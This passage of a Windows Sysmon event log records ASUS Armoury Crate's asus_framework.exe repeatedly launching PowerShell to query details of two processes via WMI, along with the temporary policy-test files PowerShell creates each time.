+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:00:05","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:00:05.473
+ProcessGuid: {7f6f9216-58d5-687d-a908-000000006901}
+ProcessId: 19148
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_0g232yn4.prm.ps1
+CreationUtcTime: 2025-07-20 21:00:05.472
+User: SHARON\Shxro"
+"20/07/2025 22:00:05","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:00:05.387
+ProcessGuid: {7f6f9216-58d5-687d-a908-000000006901}
+ProcessId: 19148
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 22:00:03","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 21:00:03.976
+ProcessGuid: {7f6f9216-58d3-687d-a208-000000006901}
+ProcessId: 15188
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_arj0ksab.sle.ps1
+CreationUtcTime: 2025-07-20 21:00:03.975
+User: SHARON\Shxro"
+"20/07/2025 22:00:03","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 21:00:03.098
+ProcessGuid: {7f6f9216-58d3-687d-a208-000000006901}
+ProcessId: 15188
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:55:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:55:31.434
+ProcessGuid: {7f6f9216-57c3-687d-9908-000000006901}
+ProcessId: 16272
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_kitdkvgw.auw.ps1
+CreationUtcTime: 2025-07-20 20:55:31.434
+User: SHARON\Shxro"
+"20/07/2025 21:55:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:55:31.360
+ProcessGuid: {7f6f9216-57c3-687d-9908-000000006901}
+ProcessId: 16272
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:55:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:55:01.430
+ProcessGuid: {7f6f9216-57a5-687d-9708-000000006901}
+ProcessId: 12068
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_qu44j0hq.jk1.ps1
+CreationUtcTime: 2025-07-20 20:55:01.430
+User: SHARON\Shxro"
+"20/07/2025 21:55:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:55:01.357
+ProcessGuid: {7f6f9216-57a5-687d-9708-000000006901}
+ProcessId: 12068
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:54:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:54:31.426
+ProcessGuid: {7f6f9216-5787-687d-8e08-000000006901}
+ProcessId: 20808
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_qhz5eegz.zuo.ps1
+CreationUtcTime: 2025-07-20 20:54:31.426
+User: SHARON\Shxro"
+"20/07/2025 21:54:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:54:31.354
+ProcessGuid: {7f6f9216-5787-687d-8e08-000000006901}
+ProcessId: 20808
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:54:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:54:01.420
+ProcessGuid: {7f6f9216-5769-687d-8c08-000000006901}
+ProcessId: 23172
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_knnv1bt0.upy.ps1
+CreationUtcTime: 2025-07-20 20:54:01.420
+User: SHARON\Shxro"
+"20/07/2025 21:54:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:54:01.347
+ProcessGuid: {7f6f9216-5769-687d-8c08-000000006901}
+ProcessId: 23172
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:53:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:53:31.406
+ProcessGuid: {7f6f9216-574b-687d-8a08-000000006901}
+ProcessId: 23644
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_koq4apft.4mk.ps1
+CreationUtcTime: 2025-07-20 20:53:31.405
+User: SHARON\Shxro"
+"20/07/2025 21:53:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:53:31.332
+ProcessGuid: {7f6f9216-574b-687d-8a08-000000006901}
+ProcessId: 23644
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:53:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:53:01.407
+ProcessGuid: {7f6f9216-572d-687d-8808-000000006901}
+ProcessId: 21116
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_nttkrepz.0lr.ps1
+CreationUtcTime: 2025-07-20 20:53:01.407
+User: SHARON\Shxro"
+"20/07/2025 21:53:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:53:01.334
+ProcessGuid: {7f6f9216-572d-687d-8808-000000006901}
+ProcessId: 21116
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:52:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:52:31.396
+ProcessGuid: {7f6f9216-570f-687d-8008-000000006901}
+ProcessId: 416
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_mmau5ivs.z2y.ps1
+CreationUtcTime: 2025-07-20 20:52:31.396
+User: SHARON\Shxro"
+"20/07/2025 21:52:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:52:31.322
+ProcessGuid: {7f6f9216-570f-687d-8008-000000006901}
+ProcessId: 416
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:52:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:52:01.385
+ProcessGuid: {7f6f9216-56f1-687d-7d08-000000006901}
+ProcessId: 12420
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_zorp3hrz.ggi.ps1
+CreationUtcTime: 2025-07-20 20:52:01.385
+User: SHARON\Shxro"
+"20/07/2025 21:52:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:52:01.311
+ProcessGuid: {7f6f9216-56f1-687d-7d08-000000006901}
+ProcessId: 12420
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:51:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:51:31.383
+ProcessGuid: {7f6f9216-56d3-687d-7b08-000000006901}
+ProcessId: 4252
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_bli2xu5a.3yg.ps1
+CreationUtcTime: 2025-07-20 20:51:31.382
+User: SHARON\Shxro"
+"20/07/2025 21:51:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:51:31.309
+ProcessGuid: {7f6f9216-56d3-687d-7b08-000000006901}
+ProcessId: 4252
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:51:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:51:01.378
+ProcessGuid: {7f6f9216-56b5-687d-7908-000000006901}
+ProcessId: 25196
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_myatnq41.3sl.ps1
+CreationUtcTime: 2025-07-20 20:51:01.378
+User: SHARON\Shxro"
+"20/07/2025 21:51:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:51:01.303
+ProcessGuid: {7f6f9216-56b5-687d-7908-000000006901}
+ProcessId: 25196
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:50:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:50:31.373
+ProcessGuid: {7f6f9216-5697-687d-7708-000000006901}
+ProcessId: 8500
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_dulkbgr4.a3p.ps1
+CreationUtcTime: 2025-07-20 20:50:31.373
+User: SHARON\Shxro"
+"20/07/2025 21:50:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:50:31.299
+ProcessGuid: {7f6f9216-5697-687d-7708-000000006901}
+ProcessId: 8500
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:50:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:50:01.366
+ProcessGuid: {7f6f9216-5679-687d-7508-000000006901}
+ProcessId: 17724
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_1ggq35bv.rl0.ps1
+CreationUtcTime: 2025-07-20 20:50:01.366
+User: SHARON\Shxro"
+"20/07/2025 21:50:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:50:01.292
+ProcessGuid: {7f6f9216-5679-687d-7508-000000006901}
+ProcessId: 17724
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:49:31","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:49:31.350
+ProcessGuid: {7f6f9216-565b-687d-7208-000000006901}
+ProcessId: 28216
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_ru5koavg.gy5.ps1
+CreationUtcTime: 2025-07-20 20:49:31.350
+User: SHARON\Shxro"
+"20/07/2025 21:49:31","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:49:31.276
+ProcessGuid: {7f6f9216-565b-687d-7208-000000006901}
+ProcessId: 28216
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
+Hashes: MD5=61732DBA77466B624C014B67A1E1348E,SHA256=D4CC57797F43E2744E5F46CFB9E69DF2944D4C809A5FA93928F453E59076F0CD,IMPHASH=9F91C97560360686D37B0E311BB8BD64
+ParentProcessGuid: {7f6f9216-39d9-687d-d001-000000006901}
+ParentProcessId: 18904
+ParentImage: C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe
+ParentCommandLine: ""C:\Program Files (x86)\ASUS\ArmouryDevice\asus_framework.exe"" --delay
+ParentUser: SHARON\Shxro"
+"20/07/2025 21:49:01","11","File created:
+RuleName: -
+UtcTime: 2025-07-20 20:49:01.344
+ProcessGuid: {7f6f9216-563d-687d-6f08-000000006901}
+ProcessId: 28316
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+TargetFilename: C:\Users\Shxro\AppData\Local\Temp\__PSScriptPolicyTest_wsrz0vnt.14f.ps1
+CreationUtcTime: 2025-07-20 20:49:01.344
+User: SHARON\Shxro"
+"20/07/2025 21:49:01","1","Process Create:
+RuleName: -
+UtcTime: 2025-07-20 20:49:01.269
+ProcessGuid: {7f6f9216-563d-687d-6f08-000000006901}
+ProcessId: 28316
+Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
+FileVersion: 10.0.22621.3085 (WinBuild.160101.0800)
+Description: Windows PowerShell
+Product: Microsoft? Windows? Operating System
+Company: Microsoft Corporation
+OriginalFileName: PowerShell.EXE
+CommandLine: powershell.exe -c gwmi win32_process -Filter 'ProcessId=24968 or ProcessId=18904' | select CreationDate,KernelModeTime,ParentProcessId,ProcessId,UserModeTime,WorkingSetSize | format-table
+CurrentDirectory: C:\WINDOWS\system32\
+User: SHARON\Shxro
+LogonGuid: {7f6f9216-39c8-687d-7b7c-070000000000}
+LogonId: 0x77C7B
+TerminalSessionId: 1
+IntegrityLevel: High
